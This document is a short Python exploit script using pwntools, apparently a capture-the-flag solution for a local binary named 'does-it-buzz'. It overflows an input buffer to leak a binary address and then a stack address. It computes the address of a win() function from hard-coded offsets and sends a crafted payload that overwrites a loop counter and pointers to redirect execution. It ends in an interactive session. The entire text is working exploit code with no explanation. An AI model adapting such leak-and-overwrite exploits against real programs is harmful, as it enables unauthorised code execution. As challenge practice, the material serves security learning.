from pwn import *

p = process("./does-it-buzz")

offset_to_buffer = 0x30 # leaked_stack - offset_to_buffer = start_of_the_buffer
offset_to_rip = 0x34 # leaked_stack + offset_to_rip = saved_rip_addr
loop_counter = 56 # offset to loop counter X bytes after start_of_input_buffer

fuzzbuzz_offset = 0x4098 # from binary
win_offset = 0x12c9 # from binary

print(p.clean())

p.send(b"A" * loop_counter + b"\xff\xff\xff\xff")

x = p.clean()
print(x)
leaked_binary = int.from_bytes(x.split(b'\xff\xff\xff\xff')[1][:6], 'little')

print("[+] Leaked Binary Address ::", hex(leaked_binary))

print(p.clean())

for i in range(5):
    print("[.] burning iterations", i)
    p.send(b"burn")
    print(p.clean())

print("[+] 5th iteration, now src* = stack")

p.send(b"A" * loop_counter + b"\xff" * 4) # \xff\xff\xff\xff will make sure v4 is -1, thus satisfying conditions to leak and to loop

x = p.clean()
print(x)
leaked_stack = int.from_bytes(x.split(b'\xff\xff\xff\xff')[1][:6], 'little')

print("[+] Leaked 'stack' address :: ", hex(leaked_stack))

binary_base = leaked_binary - fuzzbuzz_offset
win_addr = binary_base + win_offset

print("[+] win() function :: ", hex(win_addr))

input_buffer_addr = leaked_stack - offset_to_buffer
target_rip_addr = leaked_stack + offset_to_rip

print("[+] target_rip_addr :: ", hex(target_rip_addr))

print(p.clean())

payload = b""
payload += b"\x90" * 8
payload += p64(win_addr)
payload += b"\x90" * (loop_counter - len(payload))
payload += b"\x0f\x00\x00\x00"
payload += p64(input_buffer_addr + 8)
#payload += p64(leaked_stack)
payload += p64(target_rip_addr)

p.send(payload)

print(p.clean())

p.interactive()

p.close()
